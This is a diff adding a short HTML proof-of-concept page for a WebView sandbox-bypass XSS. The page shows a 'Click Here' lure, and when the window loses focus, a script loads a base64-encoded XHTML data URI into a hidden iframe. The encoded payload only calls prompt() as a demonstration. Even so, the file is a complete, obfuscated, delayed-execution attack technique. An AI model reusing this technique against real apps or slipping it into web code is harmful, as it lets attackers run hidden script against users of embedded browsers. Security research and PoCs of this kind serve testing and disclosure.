@@ -1,0 +1,28 @@
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no">
+	<title> Bypass sandbox Webview Xss Delayed JavaScript</title>
+	
+	<style>
+		iframe {
+			visibility: hidden;
+		}
+	</style>
+   
+	<script>
+		window.onblur = function() {
+			document.getElementById("iframe").src = "data:application/xhtml+xml;base64,PGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPjxoZWFkPjwvaGVhZD48Ym9keT48c2NyaXB0PnByb21wdCgnRXhlY3V0ZWQgZnJvbSBYSFRNTCsnKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==";
+		}
+	</script>
+</head>
+
+<body>
+   <center>
+		<br>
+		<h1>Click Here</h1>
+	</center>
+   <iframe id="iframe"></iframe>
+</body>
+
+</html>
